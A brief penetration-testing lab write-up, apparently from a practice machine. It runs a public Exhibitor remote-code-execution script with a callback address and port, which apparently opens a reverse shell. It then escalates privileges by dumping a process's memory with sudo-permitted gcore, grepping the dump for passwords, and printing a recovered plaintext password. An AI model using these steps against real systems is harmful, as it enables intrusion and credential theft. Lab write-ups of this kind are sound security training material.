#Pwned! 
```IP

```
## Nmap
```

```

## Nmap UDP


# Enumeration

## HTTP 8080
powered by jetty
https://github.com/thehunt1s0n/Exihibitor-RCE
```
./exploit.sh 192.168.248.98 8080 192.168.45.193 443
```
## HTTP 8081 
redirects to http://192.168.248.98:8080/exhibitor/v1/ui/index.html


# PrivEsc

## Manual
sudo -l 
reveals
ALL) NOPASSWD: /usr/bin/gcore
```
ps aux | grep -i pass
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241115171938.png?raw=true)
```
sudo gcore 490
```
```
strings core.490 | grep -i pass -C 1
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241115171858.png?raw=true)
```
ClogKingpinInning731
```
## Automated

### Peass
### Mimikatz


